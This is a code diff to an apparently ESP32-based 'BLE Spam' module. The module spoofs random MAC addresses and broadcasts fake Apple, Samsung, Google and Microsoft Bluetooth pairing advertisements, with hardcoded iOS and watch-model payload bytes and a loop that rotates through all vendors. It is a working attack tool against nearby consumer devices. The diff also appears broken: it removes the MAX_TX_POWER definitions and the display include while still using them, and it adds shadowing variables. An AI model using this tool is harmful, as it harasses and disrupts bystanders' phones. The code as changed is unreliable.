@@ -1,21 +1,21 @@
-#include "core/display.h"
 #include "core/mykeyboard.h"
 #include <globals.h>
 #include "ble_spam.h"
 #include <vector>
 
-// Bluetooth maximum transmit power
-#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
-#else
-#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
-#endif
+// Define the namespace for BLE Spam functionalities
+namespace BLESpam {
 
 struct BLEData {
     BLEAdvertisementData AdvData;
     BLEAdvertisementData ScanData;
+};
+
+enum class BLEChoice {
+    CHOICE_1 = 1,
+    CHOICE_2,
+    CHOICE_3,
+    // Add more choices as needed
 };
 
 struct WatchModel {
@@ -36,6 +36,20 @@ enum EBLEPayloadType {
     Apple,
     Samsung,
     Google
+};
+
+const uint8_t IOS1[] = {
+    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+};
+
+const uint8_t IOS2[] = {
+    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24
+};
+
+const WatchModel watch_models[26] = {
+    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
+    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
+    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
 };
 
 // Function to generate a random MAC address
@@ -118,11 +132,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
     }
-
     delete[] AdvData_Raw;
     return AdvData;
 }
 
+// Function to execute spam based on payload type
 void executeSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
@@ -130,7 +144,7 @@ void executeSpam(EBLEPayloadType type) {
     BLEDevice::init("");
     delay(1);  // Reduced delay before setting TX power
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    pAdvertising = BLEDevice::getAdvertising();
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
     NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
@@ -145,7 +159,8 @@ void executeSpam(EBLEPayloadType type) {
     BLEDevice::deinit();
 }
 
-void executeCustomSpamWithRotation() {
+// Function to execute custom spam with rotation
+void executeCustomSpamWithRotation(int rotationInterval) {
     EBLEPayloadType types[] = {Apple, Microsoft, Samsung, Google};
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
@@ -155,12 +170,15 @@ void executeCustomSpamWithRotation() {
         EBLEPayloadType randomType = types[random(0, sizeof(types) / sizeof(types[0]))];
         executeSpam(randomType);
 
+        delay(rotationInterval);
+
         if (check(EscPress)) {
             break;
         }
     }
 }
 
+// Function to handle advertisement based on BLE choice
 void aj_adv(int ble_choice) {
     int timer = 0;
     int count = 0;
@@ -190,7 +208,7 @@ void aj_adv(int ble_choice) {
                     break;
                 case 4: // Tutti-frutti
                     displayTextLine("Spam All  (" + String(count) + ")");
-                    executeCustomSpamWithRotation();
+                    executeCustomSpamWithRotation(500);  // Rotate every 500ms (configurable)
                     break;
                 case 5: // Custom
                     displayTextLine("Spamming " + spamName +  "(" + String(count) + ")");
@@ -208,7 +226,9 @@ void aj_adv(int ble_choice) {
 
     BLEDevice::init("");
     delay(100);
-    pAdvertising = nullptr;
+    BLEAdvertising *pAdvertising = nullptr;
     delay(100);
     BLEDevice::deinit();
 }
+
+} // namespace BLESpam
